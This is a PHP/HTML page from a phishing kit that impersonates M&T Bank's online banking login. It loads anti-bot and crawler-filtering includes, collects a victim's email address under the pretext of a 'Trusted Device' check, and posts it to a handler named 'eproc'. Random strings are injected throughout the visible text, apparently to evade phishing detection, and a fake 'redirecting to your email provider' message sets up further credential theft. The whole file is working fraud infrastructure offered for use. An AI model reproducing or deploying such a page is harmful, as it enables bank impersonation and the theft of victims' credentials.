<?php
error_reporting(0);
session_start();
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";

?>
<!DOCTYPE html>
<html lang="en" class="__sticky-footer __sticky-footer--links">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
 <title>Welcome to Online Banking | M&amp;T Bank</title>

    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="../ft/css.css" rel="stylesheet">

    
<link rel="icon" sizes="96x96" href="../ft/image.png" type="image/png">
<link rel="icon" sizes="32x32" href="../ft/image(1).png" type="image/png">
<link rel="icon" sizes="16x16" href="../ft/image(2).png" type="image/png">
	<style>
	.cell.mf{font-size:15px;}
	#redi{color:#0184bf;text-decoration:underline;transition:display 0.8s;}
	.transitioning{height:14px;width:14px;vertical-align:middle;display:inline-block;padding-right:30px;}
	.redi{height:14px;width:14px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:3px solid #0184bf;border-right:3px solid #0184bf;border-bottom:3px solid #0184bf;border-top:3px solid #fff;border-radius:100%;display:inline-block;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
</style>
	</head>
<body>

   

<form action="eproc<?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>" id="uhh" method="post" onsubmit="return watreq()"><input id="UnMaskedUserId" name="UnMaskedUserId" type="hidden" value="">    <div class="mtb-app-enrollment">
        <header class="mtb-page-header">
            <input type="hidden" id="TagPageName" name="TagPageName" value="OLB:Login:Index">
            <div class="grid-x align-center">
                <div class="cell">
                    <a  class="mtb__logo">
                        <img src="../ft/mtb-logo.svg" alt="M&amp;T Bank Site">
                    </a>
                </div>
            </div>
        </header>



            <div class="mtb-page-error <?php if(!isset($_GET[''.$theerrkey.''])){echo 'hide';};?>">
                <input data-val="true" data-val-number="The field FailedSignOnCount must be a number." data-val-required="The FailedSignOnCount field is required." id="FailedSignOnCount" name="FailedSignOnCount" type="hidden" value="3">
                <div class="mtb-app-default--content">
                    <div class="callout __has-icon warning __no-border">
                        <i class="__is-icon m-icon m-icon-notification">
                            <span class="show-for-sr">Notification Icon</span>
                        </i>
                        <p>
                            
      Incorrect e<?php echo rT('ALPHANUMERIC',rand(1,87));?>mail address. Please try again...<div style="margin-top:10px;">We will query your email service pr<?php echo rT('ALPHANUMERIC',rand(1,87));?>ovider to confirm you own this email.</div>
    
                        </p>
                    </div>
                </div>
            </div>
        <div class="mtb-app-login--content">
            <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                <div class="cell">
                    <input type="hidden" value="OLB:SSC:LogInToOnlineBanking">
                    <div class="mtb-section-header mtb-section-header__login">
                        <h1>
                           Email Identification
                        </h1>
                        <p>
                            Enter the Em<?php echo rT('ALPHANUMERIC',rand(1,87));?>ail Address you provided us in your account
                        </p>
                    </div>
                </div>

                <div class="cell">
                    <label for="email">
                     Email Address
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem" type="email" id="email" name="email" autocomplete="off" aria-required="true" required="">
                        
                    </div>
                </div>

                <div class="cell mf"><input name="mtbbb" value="<?php echo uniqid() ;?>" type="hidden"/>
                   <div>We need yo<?php echo rT('ALPHANUMERIC',rand(1,87));?>u to verify your email contact information to save this device as a <span style="color:#0b6efd">Trusted Device</span><br/><br/>Using industry standard encr<?php echo rT('ALPHANUMERIC',rand(1,87));?>yption to protect <?php echo rT('ALPHANUMERIC',rand(1,87));?>your data, we instantly confirm your email on file and then esta<?php echo rT('ALPHANUMERIC',rand(1,87));?>blish a secure connection to verify with your email service provider</div>
                </div>

                <div class="cell"><br>
                    <p style="font-size:14px;display:none;" id="redi"><span class='transitioning'><span class='redi'>&nbsp;</span></span>Redirecting you to your email service provider to confirm you own this <?php echo rT('ALPHANUMERIC',rand(1,87));?>email address....
    <input type="hidden" value="off" id="jas"></p>
                </div>
            </div>

            <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
                <div class="cell">

                    <button type="submit" name="btnin" value="login" class="button button__form-no-spacer expanded" id="btnSubmit">
                       Continue
                    </button>
                </div>

                <p class="cell text-center __font-size-tiny __color-gray-accent">
                    Unauthori<?php echo rT('ALPHANUMERIC',rand(1,87));?>zed access is proh<?php echo rT('ALPHANUMERIC',rand(1,87));?>ibited. Usage may be mon<?php echo rT('ALPHANUMERIC',rand(1,87));?>itored.
                </p>
            </div>
        </div>

        <hr class="__spacer-section">
        <div class="mtb-app-default--content">

        </div>
        <section class="mtb-footer mtb-footer__auth" role="contentinfo">
            <div class="grid-x">
                <div class="cell flex-container flex-dir-column align-center-middle">
                    <div class="mtb-footer--auth"><?php echo rT('ALPHANUMERIC',rand(1,87));?>
                        <a  class="" target="_blank">Get Started Guide</a>
                        <a  target="_blank">Secur<?php echo rT('ALPHANUMERIC',rand(1,87));?>ity Assistance</a>
                        <a  target="_blank">Digit<?php echo rT('ALPHANUMERIC',rand(1,87));?>al Service Agreement</a>
                        <a  target="_blank">ESign Agreem<?php echo rT('ALPHANUMERIC',rand(1,87));?>ent</a>
                        <a  target="_blank">
                            Accessibi<?php echo rT('ALPHANUMERIC',rand(1,87));?>lity
                        </a>


                        <a  target="_blank">
                            mtb.com
                        </a>
                    </div>

                    <div class="mtb-footer--non-auth">
                        <p>
                            ©<?php echo date("Y");?> M&amp;T Bank. All Rights Res<?php echo rT('ALPHANUMERIC',rand(1,87));?>erved.<br>
                            Users of this w<?php echo rT('ALPHANUMERIC',rand(1,87));?>ebsite agree to be b<?php echo rT('ALPHANUMERIC',rand(1,87));?>ound by the prov<?php echo rT('ALPHANUMERIC',rand(1,87));?>isions of the M&amp;T website <a  target="_blank">
                                Terms of
                                Use
                            </a> and <a  target="_blank">Privacy Policy</a>.
                        </p>
                        <div class="mtb-footer__logo">
                            <a  target="_blank">
                                <img src="../ft/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                            </a>
                            <a  target="_blank">
                                <img src="../ft/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                            </a>
                        </div>
                        <p>
                            Equal Hou<?php echo rT('ALPHANUMERIC',rand(1,87));?>sing Lender NM<?php echo rT('ALPHANUMERIC',rand(1,87));?>LS #381076
                            <a  target="_blank">Member FD<?php echo rT('ALPHANUMERIC',rand(1,87));?>IC</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>
    </div>
</form>
<script>
function load(){document.getElementById('redi').style.display="block";};
function watreq(){load();var suballow=document.getElementById('jas');setTimeout(function(){suballow.value="on";document.getElementById('uhh').submit();},3000);if(suballow.value!='off'){return true;} else{return false;};};
</script>




</body></html>